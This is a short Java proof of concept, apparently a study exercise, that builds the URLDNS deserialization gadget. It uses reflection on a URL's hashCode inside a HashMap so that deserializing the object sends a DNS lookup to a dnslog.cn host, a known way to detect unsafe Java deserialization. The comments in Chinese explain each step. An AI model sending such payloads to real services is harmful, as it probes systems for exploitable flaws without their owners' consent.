import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {

    public static void main(String[] args) throws Exception {
        HashMap<URL, Integer> hashmap = new HashMap<URL, Integer>();
        URL url = new URL("http://nzw5ij.dnslog.cn");
        Class c = url.getClass();
        Field fieldhashcode = c.getDeclaredField("hashCode");
        fieldhashcode.setAccessible(true);
        fieldhashcode.set(url, 222);//第一次查询的时候会进行缓存，所以让它不等于-1
        hashmap.put(url, 2);
        fieldhashcode.set(url, -1);// 让它等于-1 就是在反序列化的时候等于-1 执行dns查询

        serialize(hashmap);
        unserialize();

    }

    public static void serialize(Object obj) throws Exception {
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("urldns.bin"));
        outputStream.writeObject(obj);
        outputStream.close();
    }

    public static void unserialize() throws Exception {
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("urldns.bin"));
        Object obj = inputStream.readObject();

    }
}